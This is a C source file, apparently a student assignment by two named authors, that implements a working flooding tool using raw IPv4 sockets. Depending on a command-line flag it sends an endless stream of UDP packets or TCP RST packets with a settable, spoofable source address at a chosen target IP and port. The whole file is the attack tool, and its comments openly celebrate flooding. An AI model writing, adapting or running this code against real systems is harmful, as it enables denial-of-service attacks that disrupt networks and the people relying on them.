/*
 * ipv4.c
 *
 *      Author: Peleg Zborovsky - 316486786
 *      Author: Orian Hindi - 312320062
 */

#include <stdio.h>
#include <stdlib.h>// for exit()
#include <string.h> // memset
#include <sys/socket.h>// for socket()
#include <errno.h>// for errno - error number
#include <netinet/tcp.h>// provides declaration for tcp header
#include <netinet/udp.h>// provides declaration for udp header
#include <netinet/ip.h>// provides declaration for ip header
#include <arpa/inet.h>// for inet_addr() function to turn internet host address to binary
#include <unistd.h> // provides close() for socket
#define MESSAGE_LENGTH 4096

unsigned short checksum(unsigned short *ptr,int nbytes){
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while(nbytes > 1){
		sum += *ptr++;
		nbytes -= 2;
	}
	if(nbytes == 1){
		oddbyte = 0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum += oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short) ~sum;
	return (answer);
}


int main(int argc, char **argv) {
	int port = 443, udp = 0, source_port = 6543;
	char* t_ip = "127.0.0.1";
	char* s_ip = "192.168.1.8";
	int i = 1;
	while(i < argc){
		char* arg = argv[i++];
		if(!strcmp(arg,"-t")){// if argument is -t look for the ip ( need to validate it?)
			if(i >= argc){
				perror("Too many Arguments\n");
				exit(1);
			}
			char* param = argv[i++];
			//validate IP here?
			t_ip = param;
		}else if(!strcmp(arg,"-p")){// if argument is -p take the number as int ( validate port?)
			if(i >= argc){
				perror("Too many Arguments\n");
				exit(1);
			}
			char* param = argv[i++];
			//validate port number ?
			port = atoi(param);
		}else if(!strcmp(arg,"-r")){// if argument is -r udp flag is on!
			udp = 1;
		}else{
			perror("Wrong arguments passed\n");
			exit(1);
		}
	}//end of while(argc)
	if(udp){// udp = 1 - UDP Flood Attack!
		struct pseudo_header{
			//96 bits for checksum
			unsigned int source_address;
			unsigned int dest_address;
			unsigned char placeholder;
			unsigned char protocol;
			unsigned short udp_length;
		};

		// Create Raw Socket of type IPPROTO_RAW
		int sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
		if(sock < 0){
			perror("Socket Failed");
			exit(1);
		}

		// Message to be sent in the packet
		char message[MESSAGE_LENGTH],source_ip[32],*data,*pesudogram;

		//set zeros in message
		memset(message,0,MESSAGE_LENGTH);

		//IP Header
		struct iphdr* iph = (struct iphdr*) message;

		// UDP header
		struct udphdr* udph = (struct udphdr*) (message + sizeof(struct ip));

		struct sockaddr_in sin;
		struct pseudo_header psh;

		//Data to be Sent
		data = message + sizeof(struct iphdr) + sizeof(struct udphdr);
		strcpy(data, "Boom HeadShot!");

		//Our Address as Source (can be spoofed)
		strcpy(source_ip, s_ip);

		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(t_ip);
		sin.sin_port = htons(port);

		//Filling IP Header
		iph->ihl = 5;// minimum value for a correct header is 5 by RFC791
		iph->version = 4;
		iph->tos = 0;
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + strlen(data);// length of ip(32)+ tcp header
		iph->id = htons(port);// id of packet is port number
		iph->frag_off = 0;
		iph->ttl = 255;//time to live
		iph->protocol = IPPROTO_UDP;
		iph->check = 0; // set to 0 before calculting the checksum for the automatic calculations
		iph->saddr = inet_addr(source_ip);// source ip
		iph->daddr = sin.sin_addr.s_addr;// destination of target
		iph->check = checksum((unsigned short*) message, iph->tot_len);// calc checksum of the message length with the total length of the ip header

		//UDP Header
		udph->source = htons(source_port);
		udph->dest = htons(port);
		udph->len = htons(8 + strlen(data));// tcp size header
		udph->check = 0;// set to 0 before calculting the checksum for the automatic calculations

		// UDP checksum using pseudo header
		psh.source_address = inet_addr(source_ip);
		psh.dest_address = sin.sin_addr.s_addr;
		psh.placeholder = 0;
		psh.protocol = IPPROTO_UDP;
		psh.udp_length = htons(sizeof(struct udphdr) + strlen(data));

		int packetSize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
		pesudogram = malloc(packetSize);

		memcpy(pesudogram, (char*) &psh, sizeof(struct pseudo_header));
		memcpy(pesudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + strlen(data));

		udph->check = checksum((unsigned short*) pesudogram, packetSize);

		while(1){// Flooding Time!
			if(sendto(sock, message, iph->tot_len,0 ,(struct sockaddr*) &sin, sizeof(sin)) < 0){
				perror("Failed to send");
				close(sock);
				exit(1);
			}else{
				printf("UDP Sent!\n");
			}
		}// end of UDP Flood
	}else{// udp = 0 - TCP RST Flood Attack!
		struct pseudo_header{// needed for checksum calculations 128bits(may change with option size)
			unsigned int source_address;//96 bits without tcp header
			unsigned int dest_address;
			unsigned char placeholder;
			unsigned char protocol;
			unsigned short tcp_length;

			struct tcphdr tcp;//32 bit
		};
		// create raw socket
		int sock = socket(PF_INET,SOCK_RAW,IPPROTO_TCP);
		if(sock < 0){
			perror("Socket Failed");
			exit(1);
		}

		//Datagram to represent the packet
		char message[MESSAGE_LENGTH],source_ip[32];
		//IP header
		struct iphdr* iph = (struct iphdr*) message;
		//TCP header
		struct tcphdr* tcphdr= (struct tcphdr*) (message + sizeof(struct ip));
		struct sockaddr_in sin;
		struct pseudo_header psh;

		strcpy(source_ip,s_ip);

		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(t_ip);
		sin.sin_port = htons(port);

		memset(message,0,MESSAGE_LENGTH);// zero all buffer of message

		//fill in the IP Header
		iph->ihl = 5;// minimum value for a correct header is 5 by RFC791
		iph->version = 4;
		iph->tos = 0;
		iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);// length of ip(32)+ tcp header
		iph->id = htons(port);// id of packet is port number
		iph->frag_off = 0;
		iph->ttl = 255;//time to live
		iph->protocol = IPPROTO_TCP;
		iph->check = 0; // set to 0 before calculting the checksum
		iph->saddr = inet_addr(source_ip);// source ip
		iph->daddr = sin.sin_addr.s_addr;// destination of target
		iph->check = checksum((unsigned short*) message, iph->tot_len);// calc checksum of the message length with the total length of the ip header

		//TCP Header
		tcphdr->source = htons(source_port);
		tcphdr->dest = htons(port);
		tcphdr->seq = 0;
		tcphdr->ack_seq = 0;
		tcphdr->doff = 5;// first and only tcp segment
		//TCP Flags
		tcphdr->fin = 0;// FIN Flag = OFF
		tcphdr->syn = 0;// SYN Flag = OFF
		tcphdr->rst = 1;// RST Flag = ON
		tcphdr->psh = 0;
		tcphdr->ack = 0;
		tcphdr->urg = 0;

		tcphdr->window = htons(5840);// maximum allowed window size
		tcphdr->check = 0;// if checksum =0 the kernel's IP stack should fill in the correct checksum during transmission
		tcphdr->urg_ptr = 0;
		// IP Checksum

		psh.source_address = inet_addr( source_ip);
		psh.dest_address = sin.sin_addr.s_addr;
		psh.placeholder = 0;
		psh.protocol = IPPROTO_TCP;
		psh.tcp_length = htons(20);

		memcpy(&psh.tcp, tcphdr, sizeof(struct tcphdr));
		//checksum of tcp header
		tcphdr->check = checksum((unsigned short*)&psh, sizeof(struct pseudo_header));

		//IP_HDRINCL to tell the kernel that headers are included in the packet
		int one = 1;
		const int* val = &one;
		if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,val,sizeof(one)) < 0){
			perror("Bad Setting IP_HDRINCL");
			exit(1);
		}
		while(1){// Flooding TCP RST!
			if(sendto(sock,// socket we created
					message,// our buffer with headers and data
					iph->tot_len,//total length of our datagram
					0,// routing flags, normally always 0
					(struct sockaddr*) &sin,// socket address, just like in normal send + size of it
					sizeof(sin)) < 0){
				perror("Message Failed");
				close(sock);
				exit(1);
			}else{
				printf("RST Sent!\n");
			}
		}
	}
	return 0;
}
